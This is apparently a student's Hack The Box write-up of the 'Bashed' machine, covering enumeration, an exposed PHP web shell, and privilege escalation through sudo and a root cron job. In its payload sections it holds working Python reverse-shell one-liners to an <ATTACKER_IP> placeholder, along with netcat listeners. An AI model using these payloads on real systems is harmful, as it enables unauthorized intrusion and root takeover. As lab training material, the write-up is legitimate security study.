**Difficulty:** Easy

**OS:** Linux

**Date Completed:** 2026-09-25

**Write-up Authored by:** Ian Simons

**Challenge Created by:** Arrexel

**Core Competencies:** 

- Web application enumeration

- Post-exploitation Enumeration

- Linux Privilege Escalation

---
### Overview
This Machine was completed as a complement to my training in the Hack The Box Academy Penetration Tester Job-Role Path. This box was chosen to further improve my manual enumeration and exploitation skills, and build confidence in my existing skill set.
Note: Flags documented in Appendix B.

---
### Vulnerability Summary

| Vulnerability                                               | Vulnerability Classification                                                                                                      | CVSS Score | MITRE ATT&CK Technique                                               | ATT&CK Tactic        |     |
| ----------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------- | ---------- | -------------------------------------------------------------------- | -------------------- | --- |
| Exposed Unauthenticated PHP Web Shell                       | CWE-306: Missing Authentication for Critical function, <br>CWE-862: Missing Authorization, OWASP 2025:A01 - Broken Access Control | 9.8 (v3)   | T1190 - Exploit Public Facing Application                            | Initial Access       |     |
| Sudo Misconfiguration Allowing User Impersonation           | CWE-266: Incorrect Privilege Assignment, CWE-269: Improper Privilege Management                                                   | 6.8 (v3)   | T1548.003 - Abuse Elevation Control Mechanism: Sudo and Sudo Caching | Privilege Escalation |     |
| Root-Owned Scheduled Task Executing User-Controlled Scripts | CWE-732: Incorrect Permission Assignment for Critical Resource                                                                    | 8.8 (v3)   | T1053.003 - Scheduled Task/Job: Cron                                 | Privilege Escalation |     |

---
### Attack Path Summary
1. Performed network reconnaissance with Nmap and identified Apache HTTP service running on Ubuntu

2. Performed web enumeration and identified an exposed webshell with no access controls

3. Leveraged the existing web shell to obtain a Python reverse shell on target machine.

4. Identified that user www-data could use sudo to execute commands as scriptmanager

5. Identified that scriptmanager had write access to the **/scripts** directory. Further observation revealed that Python scripts in this directory were executed by a root-owned scheduled task every minute

6. Placed a Python reverse shell in the **/scripts** directory and leveraged the root-owned scheduled task to obtain a root shell

---
### Reconnaissance
#### Port Discovery
Nmap Scan Results
```
# Nmap 7.99 scan initiated Fri Sep 25 08:30:12 2026 as: /usr/lib/nmap/nmap --privileged -sC -sV -oA nmap/scan -p- 10.129.75.123
Nmap scan report for 10.129.75.123
Host is up (0.051s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Sep 25 08:30:51 2026 -- 1 IP address (1 host up) scanned in 39.02 seconds
```

#### Key Open Ports and Services
| Port | Service | Version |
| --- | --- | --- |
|80/tcp | HTTP | Apache httpd 2.4.18 |

#### Web Enumeration
Initial manual web enumeration yielded no immediate attack vectors. The home page primarily described a custom web shell developed by the site owner. A **Gobuster** scan was then run. The results are below. 
```
──(kali㉿kali)-[~/Documents/write-up-gen]
└─$ gobuster dir -u http://10.129.75.123 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.75.123
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
images               (Status: 301) [Size: 315] [--> http://10.129.75.123/images/]
uploads              (Status: 301) [Size: 316] [--> http://10.129.75.123/uploads/]
php                  (Status: 301) [Size: 312] [--> http://10.129.75.123/php/]
css                  (Status: 301) [Size: 312] [--> http://10.129.75.123/css/]
dev                  (Status: 301) [Size: 312] [--> http://10.129.75.123/dev/]
js                   (Status: 301) [Size: 311] [--> http://10.129.75.123/js/]
fonts                (Status: 301) [Size: 314] [--> http://10.129.75.123/fonts/]
server-status        (Status: 403) [Size: 301]
Progress: 220558 / 220558 (100.00%)
===============================================================
Finished
===============================================================

```
The **Gobuster** scan identified the **/dev** directory. Further enumeration of this location exposed **/dev/phpbash.php**, an accessible PHP web shell. 

#### Vulnerability Research
**/dev/phpbash.php** is accessible to any user who discovers it; it has no authentication mechanism. This means that an attacker who successfully identifies this file immediately obtains unauthenticated remote code execution. 

---
### Initial Access
#### Vulnerability Details
**Description:** Exposed Unauthenticated PHP Web Shell

**Vulnerability Classification:** CWE-306: Missing Authentication for Critical function, CWE-862: Missing Authorization, OWASP 2025:A01 - Broken Access Control

**CVSS Score:** 9.8 (v3)

**MITRE ATT&CK:** Initial Access - T1190 - Exploit Public Facing Application

An exposed and unauthenticated PHP web shell was identified at **/dev/phpbash.php**. Arbitrary commands could be executed through the interface, allowing a Python reverse shell payload to be launched and resulting in interactive command execution on the target host. 
#### Exploitation Steps

The exposed web shell permitted arbitrary command execution in the web server's security context. This capability was used to execute a Python reverse shell payload and obtain an interactive session on the target system. 

1. Navigate to **/dev/phpbash.php**

2. Run `nc -lvnp 4242` on the attacker machine

3. Execute a Python reverse shell payload through the web shell interface


#### Key Commands / Payloads
```
#Set up reverse shell catcher

nc -lvnp 4242

#Python reverse shell to be run in the webshell
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'

```

#### Proof of Access
##### Screenshots
![InitialAccess.jpg](../../../images/Bashed/InitialAccess.jpg)

Figure 1: Proof of initial access gained through the exposed PHP web shell. Interactive command execution was validated by confirming the current user context, hostname, and operating system. 

##### Session Validation Commands
```
#Verify execution context
whoami

#Verify user id
id

#Verify target hostname
hostname

#Verify target operating system
uname -a
```

---
### Privilege Escalation
#### Vulnerability Details
**Description:** Sudo Misconfiguration Allowing User Impersonation, Root-Owned Scheduled Task Executing User-Controlled Scripts

**Vulnerability Classification:** CWE-266: Incorrect Privilege Assignment, CWE-269: Improper Privilege Management, CWE-732: Incorrect Permission Assignment for Critical Resource

**CVSS Scores:** 6.8 (v3), 8.8 (v3)

**MITRE ATT&CK:** Privilege Escalation - T1548.003 - Abuse Elevation Control Mechanism: Sudo and Sudo Caching, Privilege Escalation - T1053.003 - Scheduled Task/Job: Cron 

Sudo enumeration revealed that www-data was able to run commands as scriptmanager without a password. Additional enumeration identified the **/scripts** directory, which was writable by the scriptmanager user, and a root-owned scheduled task that executed Python scripts from this directory every minute. Because the scriptmanager user could modify files within /scripts and a root-owned scheduled task executed scripts from that directory, arbitrary code execution as root was possible. This scheduled task was identified by observing that the existing script **test.py** would output the file **test.txt**, which was owned by root. A Python script was created that wrote the current timestamp to a file each time it was executed. The file updated automatically every minute and was owned by root, confirming execution in the root security context.

1. Enumerate sudo permissions and identify that www-data can run commands as scriptmanager without a password

2. Leveraged sudo permissions to obtain an interactive shell running as scriptmanager

3. Identified **/scripts** directory, which was writable by the scriptmanager user

4. Determined that a root-owned scheduled task was executing Python scripts from the **/scripts** directory every minute through observation of file creation and execution behavior

5. Placed a Python reverse shell in the **/scripts** directory and leveraged execution by the root-owned scheduled task to obtain a shell running as root

#### Key Commands / Payloads
```
#enumerate Sudo permissions
sudo -l

#Start interactive shell as scriptmanager
sudo -u scriptmanager "/bin/bash"

#Check privileges of /scripts directory
ls -ld /scripts

#Place python reverse shell in /scripts directory
echo 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",8282));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")' > /scripts/shell.py

#Setup Netcat listener
nc -lvnp 8282
```

#### Proof of Privilege Escalation
##### Screenshots
![PrivEsc.jpg](../../../images/Bashed/PrivEsc.jpg)

Figure 2: Proof of Privilege Escalation. Deployment of a Python script executed by a root-owned scheduled task resulted in code execution as root. Elevated privileges were validated by confirming the execution context with the `whoami` command and `id`.

##### Session Validation Commands
```
#Verify execution context
whoami

#Verify user id
id

#Verify target hostname
hostname

#Verify target operating system
uname -a
```

---
### Lessons Learned
The goal of this box was to further improve my manual enumeration and exploitation skills. While there were some learning points along the way, this box definitely increased my confidence in my existing skills. 

- Slow down and observe system behavior. Valuable findings are often revealed through patterns that emerge over time

- Focus on observable behavior first. Complete understanding of the underlying mechanism is not always required to identify a viable attack path

- Manually validate findings. Additional context and opportunities are often discovered during hands-on verification

---
### Appendix
#### Appendix A
##### Tools Used

| Tool | Purpose |
| --- | --- |
| Nmap | Network and Service Enumeration| 
| Gobuster | Web Enumeration | 

#### Appendix B
##### Flags Found
![UserFlag.jpg](../../../images/bashed/UserFlag.jpg)

User Flag:

980\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*597

![RootFlag.jpg](../../../images/bashed/RootFlag.jpg)

Root Flag:

101\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*acd

### Appendix C
#### Supporting Evidence
No additional supporting evidence was required beyond the artifacts included throughout this write-up.